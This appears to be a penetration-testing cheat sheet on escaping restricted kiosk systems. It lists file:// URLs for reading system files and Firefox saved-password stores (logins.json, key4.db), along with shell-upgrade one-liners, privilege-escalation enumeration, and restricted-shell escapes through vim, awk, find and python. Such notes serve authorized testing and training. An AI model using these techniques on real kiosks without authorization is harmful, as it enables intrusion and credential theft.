---
tags:
  - Defense_Evasion
  - Foundational
  - Linux
  - Mobile
  - Privilege_Escalation
---

## Kiosk Enumeration
resources: [Kiosk Breakout Techniques](https://book.hacktricks.wiki/en/hardware-physical-access/escaping-from-gui-applications.html)

> [!info] Kiosk systems restrict users to specific applications. Goal is to escape to shell access.

### Identify Kiosk Type
> [!tip] Common kiosk types:
> - Browser-based kiosk (Firefox, Chrome)
> - Application-specific kiosk
> - Custom GUI application

### Browser Enumeration [Remote]
```text
# Try these in URL bar:
file:///
file:///etc/passwd
file:///home/
about:config (Firefox)
chrome://settings (Chrome)
```

### Keyboard Shortcuts to Try
> [!tip] Try these keyboard shortcuts:
> - **Ctrl+Alt+T** - Terminal (Ubuntu)
> - **Ctrl+Alt+F1-F6** - Virtual consoles
> - **Alt+F2** - Run dialog
> - **Ctrl+Shift+Esc** - Task manager
> - **Alt+Tab** - Window switcher

## Command Execution via Browser

### URL Bar Execution
```text
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

### File Protocol Browsing
```text
file:///etc/passwd
file:///home/kiosk/.bashrc
file:///proc/self/environ
```

### Developer Tools
> [!tip] Browser dev tools access:
> - **F12** or **Ctrl+Shift+I** - Open dev tools
> - Console tab allows JavaScript execution

```javascript
// In browser console
fetch('file:///etc/passwd').then(r=>r.text()).then(console.log)
```

## Filesystem Exploration

### Find Writable Directories [Remote]
```bash
find / -writable -type d 2>/dev/null
```

### Common Writable Locations
> [!tip] Writable directories:
> - **/tmp** - Usually writable
> - **/var/tmp** - Persists across reboots
> - **/dev/shm** - RAM-based, fast

### Save Files via Browser
> [!tip] Right-click, Save As, Navigate to /tmp

## Firefox Profile Exploitation

### Find Firefox Profiles [Remote]
```text
file:///home/kiosk/.mozilla/firefox/
```

### Read Saved Passwords
```text
file:///home/kiosk/.mozilla/firefox/<Profile>/logins.json
file:///home/kiosk/.mozilla/firefox/<Profile>/key4.db
```

### Preferences for Execution [Remote]
```bash
# If can write to prefs.js
echo 'user_pref("browser.shell.checkDefaultBrowser", false);' >> prefs.js
```

## System Information via Browser

### Proc Filesystem
```text
file:///proc/version
file:///proc/cpuinfo
file:///proc/self/cmdline
file:///proc/self/environ
file:///proc/self/cwd
```

### Network Information
```text
file:///etc/hosts
file:///etc/resolv.conf
file:///proc/net/tcp
```

## Post-Exploitation

### Simulating Interactive Shell [Remote]
```bash
# If limited shell available
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Upgrade Shell [Remote]
```bash
script -qc /bin/bash /dev/null
export TERM=xterm
```

## Privilege Escalation in Kiosk

### Check Sudo Permissions [Remote]
```bash
sudo -l
```

### SUID Binaries [Remote]
```bash
find / -perm -4000 2>/dev/null
```

### Cron Jobs [Remote]
```bash
cat /etc/crontab
ls -la /etc/cron.d/
```

### Kiosk User Permissions [Remote]
```bash
id
groups
cat /etc/passwd | grep kiosk
```

## Breaking Restricted Shell

### Common Bypasses
```bash
# If vim/vi allowed
:!/bin/bash

# If less/more allowed
!/bin/bash

# If awk allowed
awk 'BEGIN {system("/bin/bash")}'

# If find allowed
find . -exec /bin/bash \;

# If python allowed
python -c 'import os; os.system("/bin/bash")'
```
